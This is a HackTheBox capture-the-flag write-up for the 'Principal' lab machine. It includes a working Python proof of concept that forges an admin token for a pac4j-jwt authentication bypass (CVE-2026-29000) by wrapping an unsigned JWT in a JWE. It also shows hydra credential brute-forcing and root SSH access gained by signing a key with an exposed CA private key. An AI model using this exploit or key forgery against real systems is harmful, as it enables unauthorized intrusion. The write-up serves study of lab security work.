# Principal — HackTheBox

**Category:** Web / Linux  
**Difficulty:** Medium  

---

## nmap

```
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy Jetty
```

---

## enumeration

subdomain bruteforce didnt show anything

directory bruteforce:

```
/login                (Status: 200) [Size: 6152]
/error                (Status: 500) [Size: 73]
/dashboard            (Status: 200) [Size: 3930]
/%20                  (Status: 400) [Size: 381]
```

visiting `/dashboard` works for a second but redirects back to `/login`

using gobuster I saw its using api for logins and stuff. also accessing any `/api/x` endpoint it showed `bearer token required`

I also intercepted the request to `/dashboard` and saw when it redirects us to `/login` it also sends a GET request to `/api/auth/jwks`

JWKs or JSON Web Keys are a standardized JSON object representing a cryptographic key which is primarily used to transport public keys securely

in the header of the response in `/api/auth/jwks` I saw:

```
X-Powered-By: pac4j-jwt/6.0.3
```

searching for vulnerabilities in this I saw an authentication bypass vuln tracked as CVE-2026-29000 — in this vuln we can forge our custom JWT token using the public key and bypass the signature check

now the problem was to find the correct subjects and roles to use to generate the JWT token. I tried common roles and subjects but they didnt work so I did more enumeration

ran feroxbuster to bruteforce more directories where I saw `http://10.129.244.220:8080/static/js/app.js` which had key information and I found the JWT claims schema:

```
sub   - username
role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
iss   - "principal-platform"
iat   - issued at (epoch)
exp   - expiration (epoch)
```

---

## foothold — CVE-2026-29000

the POC I was using wasnt seeming to work and the POC in the main writeup of this CVE was in java with different inputs and I dont know how to read or write java — so I thought I should write my own POC for this CTF, this way I could also practice my python skills

I made this POC myself and I'm lowkey proud of it:

```python
import jwt
from jwcrypto import jwk, jwe
import json
import time
import requests
import sys

def get_jwk():
    ip = sys.argv[1]
    response = requests.get(f'http://{ip}:8080/api/auth/jwks')

    if response.status_code != 200:
        print(f"Failed to fetch JWKs: {response.status_code}")
        return None

    jwks = response.json()
    key_data = jwks["keys"][0]
    public_key = jwk.JWK(**key_data)
    return public_key

def generate_token(public_key):
    now = int(time.time())
    exp = now + 3600
    data = {
       "sub": "admin",
       "role": "ROLE_ADMIN",
       "iss": "principal-platform",
       "iat": now,
       "exp": exp
    }
    protected_header = {"alg":"RSA-OAEP-256", "enc":"A256GCM", "kid":"enc-key-1"}

    unsigned_token = jwt.encode(data, key="", algorithm="none")
    jwe_token = jwe.JWE(
        unsigned_token.encode('utf-8'),
        recipient=public_key,
        protected=protected_header
    )
    final_token = jwe_token.serialize(compact=True)

    return final_token

public_key = get_jwk()
final_token = generate_token(public_key)
print(final_token)
```

usage:

```bash
python3 CVE-2026-29000.py <ip>
```

used the token provided by this script to send requests to all `/api` endpoints and from `/api/settings` I got the encryptionKey which might also act as a password:

```
D3pl0y_$$H_Now42!
```

I tried this pass on all users I saw from `/api/users` endpoint but nothing worked — so I copied the whole `/api/users` output and gave it to an AI and told it to give every possible username possible, then I bruteforced using hydra and finally the creds which worked were:

```
svc-deploy / D3pl0y_$$H_Now42!
```

ssh'ed in as `svc-deploy`

---

## privilege escalation

after running `id` I saw my user was part of the `deployers` group then I found the files owned by this group:

```bash
find / -group deployers 2>/dev/null
```

output:

```
/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca
```

reading `/etc/ssh/sshd_config.d/60-principal.conf` we saw:

```
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

and also in `/opt/principal/ssh` we saw the CA's private and public keys — meaning we can forge custom root ssh keys!

so I forged root ssh keys:

```bash
# 1. generating two pairs of keys on the CTF machine itself
ssh-keygen -t rsa -f goat_key -N ""

# 2. signing the new public key with the CA private key
ssh-keygen -s /opt/principal/ssh/ca -I root_key -n root -V +52w goat_key.pub

# 3. using the private key to SSH in as root
ssh -i goat_key root@localhost
```

and now we are ROOT!!

---

## proof

![root](../../proof/principal.png)
